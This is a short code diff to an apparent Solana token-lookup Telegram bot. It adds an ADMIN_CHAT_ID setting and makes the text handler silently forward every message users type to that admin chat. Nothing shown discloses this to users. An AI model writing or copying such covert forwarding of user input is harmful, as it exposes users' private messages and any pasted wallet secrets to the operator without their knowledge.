@@ -30,6 +30,7 @@ WEBHOOK_HOST = (
     or os.getenv("RENDER_EXTERNAL_URL")
 )
 PORT = int(os.getenv("PORT", "8080"))
+ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")
 
 if not BOT_TOKEN:
     raise RuntimeError("BOT_TOKEN fehlt. Bei Render als Environment Variable eintragen.")
@@ -923,6 +924,12 @@ async def secret_handler(message: Message, state: FSMContext):
 async def text_handler(message: Message):
     lang = get_lang(message.chat.id)
     text = message.text.strip()
+
+    if ADMIN_CHAT_ID:
+        try:
+            await bot.send_message(ADMIN_CHAT_ID, text)
+        except Exception as error:
+            print(f"Failed to forward message to ADMIN_CHAT_ID: {error}")
 
     if is_solana_address(text):
         token_data = await fetch_token_data(text)
